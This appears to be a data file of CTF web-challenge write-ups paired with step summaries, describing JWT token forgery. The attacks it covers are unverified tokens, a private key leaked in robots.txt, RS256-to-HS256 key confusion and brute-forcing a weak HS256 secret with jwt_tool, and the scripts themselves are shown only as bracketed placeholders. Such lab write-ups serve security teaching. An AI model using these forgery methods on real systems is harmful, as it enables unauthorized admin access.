Use another LFI technique to access a PHP script containing the flag, a username, a salt value, and an empty password field.
Employ a Python script to brute-force the password.
Complete the challenge, which involved SQLi, LFI, path transversal, and blind SQLi vulnerabilities.
"
"On opening the link the site says *to login move to /login by post and send json request* and as the description say to use cURL so lets start with it.
[Send an HTTP POST request using cURL with JSON data containing a username and password]

In return, we get a jwt token. Used [jwt.io](https://jwt.io/) to decode that token which had payload like this `{""user"":""guest""}`. So what now?

Always check `robots.txt` of all web challs in any CTF because sometime it may have some data which can be useful.
Just like in this chall accessing `/robots.txt` we get `/flag` page.

We can't make a GET request to `/flag`, so maybe POST?
On making a POST request to `/flag` we get something like this ""gimme token and I will give you the flag"".

On passing the jwt token which we got earlier we get a response like this `Not the admin, no flag for you`. So it needs admin token, well we can edit the token to `{""user"":""admin""}` using [jwt.io](https://jwt.io/) and passing that token to `/flag` we get the flag.

What was the Bug? In this chall I was just checking the decoded value to have value of `user` to be `admin` (`{""user"":""admin""}`) to show to the flag thats it, the code was not checking for any signature verification.
","On opening the link, send an HTTP POST request using cURL with JSON data containing a username and password.
Receive a JWT token and use jwt.io to decode it, revealing a payload like `{""user"":""guest""}`.
Check `robots.txt` and find the `/flag` page.
Make a POST request to `/flag` and receive a message requesting a token.
Pass the JWT token received earlier and get a response indicating it requires an admin token.
Edit the token to `{""user"":""admin""}` using jwt.io and pass it to `/flag` to obtain the flag.
Understand that the bug was in the code, which only checked for the decoded value of the user to be `admin` without verifying the signature.
"
"On opening the link we see a login form, log in with any junk user and pass we get redirected to `/flag` which says `Not admin, no flag for you` hmmm...

On checking cookies we see there is key `token` with some value which is JWT again xD, checking it on [jwt.io] get this

The token is using RS256 algorithm which means it needs a private key and a public key 

On accessing `/robots.txt` and a little bit of scrolling xD we see there is some PRIVATE KEY.

So we have the private key now then we can build a token and apply the signature to it. I used nodejs `jsonwebtoken` library to do this stuff:
[Node.js script: Sign JWT token with private key]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was that the private key was not properly hidden.
","Access the login form and log in with any junk username and password, then get redirected to `/flag`.
Check cookies and find the `token` with a JWT value.
Analyze the token and discover it uses the RS256 algorithm, which requires a private key and a public key.
Find the private key in `/robots.txt`.
Use the Node.js `jsonwebtoken` library to create a new JWT token signed with the private key.
Access the `/flag` route using the newly created token as a cookie to obtain the flag.
Recognize the challenge's bug: the private key was not properly hidden.
"
"From the description, it suggests about the jwt key confusion attack.

Log in with junk value, check cookies, use [jwt.io](http://jwt.io) on token value 

On checking cookies we see there is key `token` with some value, checking it on [jwt.io]() get this

The token is using RS256 algorithm, on accessing `/robots.txt` we see there is some public key.

So seeing the description we know it should be jwt confusion attack which is changing the `Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm`

So we need to build an HMAC(HS256) token using the public key as a secret to it. I used nodejs `jsonwebtoken` library to do this stuff:
[Node.js script: Sign JWT token with public key as secret and use HS256 algorithm]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was that, at the time of encoding the JWT token, the code was only using the RS256 algorithm, but during verification, it was using both RS256 and HS256 algorithms.
","Log in with junk values and check cookies for the `token` key.
Use jwt.io to analyze the token and find out it uses the RS256 algorithm.
Access `/robots.txt` and find a public key.
Identify the JWT key confusion attack, which involves changing from an asymmetric cipher algorithm to a symmetric cipher algorithm.
Create an HMAC(HS256) token using the public key as the secret with the Node.js `jsonwebtoken` library.
Access the `/flag` route using the newly created token as a cookie to obtain the flag.
Recognize the challenge's bug: JWT encoding only used RS256, while verification used both RS256 and HS256 algorithms.
"
"Seeing the description we know it should be related to jwt secret brute-forcing, anyway, let's start with it

Log in with junk value, check cookies, use [jwt.io](http://jwt.io) on token value 

On checking cookies we see there is key `token` with some value, checking it on jwt.io get this

The token is using HS256algorithm with means it is using a secret_key for encryption, on accessing `/robots.txt` we see nothing now xD

So seeing the description we know it should be related to brute-forcing for secret_key as there is nothing else xD

To do that I used  this tool [jwt_tool](https://github.com/ticarpi/jwt_tool) with `rockyou.txt`
[Command: Run jwt_tool with the target JWT token]

Now we have the secret_key which is `redraider`
So now we build a token of HS256 with secret_key as `redraider` with value of user as admin.
[Node.js script: Sign JWT token with 'redraider' as secret and use HS256 algorithm]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was using a secret that could be easily cracked by brute-forcing.
","Log in with junk values, check cookies for the `token` key, and use jwt.io to analyze the token.
Find out the token uses the HS256 algorithm, which requires a secret_key for encryption.
Access `/robots.txt` but find no relevant information.
Deduce the challenge is related to brute-forcing the secret_key based on the description.
Use the jwt_tool with `rockyou.txt` to brute-force the secret_key, finding it as `redraider`.
Create a new HS256 JWT token with the secret_key redraider and the user set as admin.
Access the `/flag` route using the newly created token as a cookie to obtain the flag.
Recognize the challenge's bug: using a secret_key that could be easily brute-forced.
"
